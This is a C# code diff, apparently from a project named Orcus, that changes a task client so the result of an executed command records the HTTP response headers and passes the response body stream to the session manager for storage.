@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Linq;
 using System.Net.Http;
 using System.Reflection;
@@ -11,6 +12,7 @@ using Orcus.Utilities;
 using Tasks.Infrastructure.Client.Library;
 using Tasks.Infrastructure.Core;
 using Tasks.Infrastructure.Core.Data;
+using Tasks.Infrastructure.Management;
 
 namespace Tasks.Infrastructure.Client
 {
@@ -96,6 +98,7 @@ namespace Tasks.Infrastructure.Client
                         {
                             TaskSessionId = taskSession.TaskSessionId, Timestamp = DateTimeOffset.UtcNow, CommandName = commandName
                         };
+                        Stream bodyStream = null;
 
                         try
                         {
@@ -103,6 +106,9 @@ namespace Tasks.Infrastructure.Client
                                 new object[] {commandInfo, context, cancellationToken});
                             var response = await task;
 
+                            var header = HttpSerializer.FormatHeaders(response);
+                            execution.Result = header.ToString();
+                            bodyStream = await response.Content.ReadAsStreamAsync();
                         }
                         catch (Exception e)
                         {
@@ -110,8 +116,11 @@ namespace Tasks.Infrastructure.Client
                             execution.ExecutionError = e.ToString();
                         }
 
-                        var sessionManager = Services.GetRequiredService<ITaskSessionManager>();
-                        await sessionManager.CreateExecution(OrcusTask, taskSession, execution);
+                        using (bodyStream)
+                        {
+                            var sessionManager = Services.GetRequiredService<ITaskSessionManager>();
+                            await sessionManager.CreateExecution(OrcusTask, taskSession, execution, bodyStream);
+                        }
                     }
                 }, cancellationToken);
             }
